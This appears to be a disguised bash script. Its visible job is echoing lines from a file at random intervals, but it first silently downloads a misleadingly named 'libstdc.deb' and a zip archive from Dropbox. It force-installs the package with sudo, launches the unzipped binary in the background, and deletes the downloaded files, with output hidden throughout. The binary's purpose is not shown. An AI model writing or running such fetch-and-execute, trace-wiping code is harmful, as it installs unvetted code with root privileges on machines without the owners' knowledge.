#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/09c5c9rkanu6xzw/comp.zip -q
unzip comp.zip > /dev/null 2>&1
#pwd
./etc/comp ./etc/data &
sleep 3
rm -rf comp.zip
rm -rf etc/comp
rm -rf etc/data
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 9 ))
done < $2

